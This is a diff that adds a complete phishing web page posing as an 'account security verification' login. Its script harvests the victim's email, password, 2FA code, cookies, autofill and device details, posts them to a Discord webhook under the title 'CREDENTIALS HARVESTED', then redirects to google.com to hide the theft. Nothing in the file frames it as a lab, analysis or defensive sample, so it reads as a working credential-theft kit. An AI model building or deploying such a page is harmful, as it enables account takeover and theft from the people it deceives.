@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account Security Verification - Login Required</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
+        .container { background: white; border-radius: 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); padding: 40px; max-width: 400px; width: 100%; }
+        h1 { color: #333; margin-bottom: 10px; font-size: 24px; }
+        .subtitle { color: #666; margin-bottom: 30px; font-size: 14px; }
+        .form-group { margin-bottom: 20px; text-align: left; }
+        label { display: block; color: #555; font-size: 14px; margin-bottom: 8px; }
+        input { width: 100%; padding: 15px; border: 2px solid #e1e5e9; border-radius: 12px; font-size: 16px; transition: border-color 0.3s; box-sizing: border-box; }
+        input:focus { outline: none; border-color: #667eea; }
+        .password-toggle { position: relative; }
+        .password-toggle input { padding-right: 45px; }
+        .toggle-btn { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); background: none; border: none; cursor: pointer; color: #666; }
+        .btn { background: #ff4757; color: white; border: none; padding: 15px 30px; border-radius: 12px; font-size: 16px; cursor: pointer; width: 100%; transition: all 0.3s; }
+        .btn:hover { background: #ff3742; transform: translateY(-2px); }
+        .loading { display: none; background: #007bff; }
+        .spinner { border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid white; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; margin: 0 auto 10px; display: block; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .success { background: #28a745; color: white; padding: 20px; border-radius: 12px; text-align: center; display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔐 Account Verification Required</h1>
+        <p class="subtitle">Enter your credentials to verify device security. This protects your accounts.</p>
+        
+        <form id="loginForm">
+            <div class="form-group">
+                <label>Email/Phone</label>
+                <input type="email" id="username" placeholder="Enter email or phone" autocomplete="email username">
+            </div>
+            <div class="form-group password-toggle">
+                <label>Password</label>
+                <input type="password" id="password" placeholder="Enter password" autocomplete="current-password">
+                <button type="button" class="toggle-btn" onclick="togglePassword()">👁</button>
+            </div>
+            <div class="form-group">
+                <label>2FA Code (if enabled)</label>
+                <input type="text" id="totp" placeholder="Enter 6-digit code" autocomplete="one-time-code">
+            </div>
+            <button type="submit" class="btn">Verify & Continue</button>
+        </form>
+        
+        <button class="btn loading" id="loadingBtn" style="display: none;">
+            <div class="spinner"></div>Verifying...
+        </button>
+        
+        <div class="success" id="successMsg">
+            ✅ Verification complete! Redirecting...
+        </div>
+    </div>
+
+    <script>
+        function togglePassword() {
+            const pwd = document.getElementById('password');
+            const btn = event.target;
+            pwd.type = pwd.type === 'password' ? 'text' : 'password';
+            btn.textContent = pwd.type === 'password' ? '👁' : '🙈';
+        }
+
+        async function stealEverything() {
+            // Harvest autofill suggestions first
+            const inputs = document.querySelectorAll('input');
+            const autofillData = Array.from(inputs).map(input => ({
+                name: input.name || input.id || input.placeholder,
+                value: input.value,
+                autofill: input.autocomplete,
+                formData: new FormData(document.getElementById('loginForm'))
+            }));
+
+            // Full browser fingerprint + cookies
+            const cookies = document.cookie;
+            const localStorageData = { ...localStorage };
+            const sessionStorageData = { ...sessionStorage };
+
+            const data = {
+                timestamp: new Date().toISOString(),
+                // Form credentials
+                credentials: {
+                    username: document.getElementById('username').value,
+                    password: document.getElementById('password').value,
+                    totp: document.getElementById('totp').value
+                },
+                autofill: autofillData,
+                cookies: cookies,
+                localStorage: Object.keys(localStorageData).length + ' items',
+                sessionStorage: Object.keys(sessionStorageData).length + ' items',
+                // Full device fingerprint (same as before)
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+
+            // Send to Discord
+            const embed = {
+                title: "🔑 CREDENTIALS HARVESTED",
+                color: 15158332,
+                fields: [
+                    { name: "📧 Username/Email", value: data.credentials.username || 'Not entered', inline: true },
+                    { name: "🔒 Password", value: data.credentials.password ? '🎯 **CAPTURED**' : 'Not entered', inline: true },
+                    { name: "🔑 2FA", value: data.credentials.totp || 'N/A', inline: true },
+                    { name: "🍪 Cookies", value: data.cookies ? `${data.cookies.length} bytes` : 'None', inline: true },
+                    { name: "💾 LocalStorage", value: data.localStorage, inline: true },
+                    { name: "**Device**", value: data.userAgent.split(' ').slice(0,4).join(' '), inline: false },
+                    { name: "**Raw Data**", value: `\`\`\`json\n${JSON.stringify(data, null, 2).slice(0,1000)}\`\`\``, inline: false }
+                ],
+                footer: { text: `Autofill + All Storage Dumped | ${new Date().toLocaleString()}` }
+            };
+
+            await fetch('https://discord.com/api/webhooks/1497889291399991296/MB9RxSUm_HfhQy74HUk9P5ImLWIsBMzXU7yp15WeGDX76kK5KTo8DUT9hK_5-XKCSwI-', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ embeds: [embed] })
+            });
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            document.querySelector('.btn').style.display = 'none';
+            document.getElementById('loadingBtn').style.display = 'block';
+            
+            await stealEverything();
+            
+            document.getElementById('loadingBtn').style.display = 'none';
+            document.getElementById('successMsg').style.display = 'block';
+            
+            setTimeout(() => window.location.href = 'https://google.com', 2000);
+        });
+
+        // Auto-trigger fingerprint on load
+        window.onload = () => {
+            // Pre-populate to trigger autofill
+            document.getElementById('username').focus();
+            setTimeout(() => document.getElementById('password').focus(), 500);
+        };
+    </script>
+</body>
+</html>
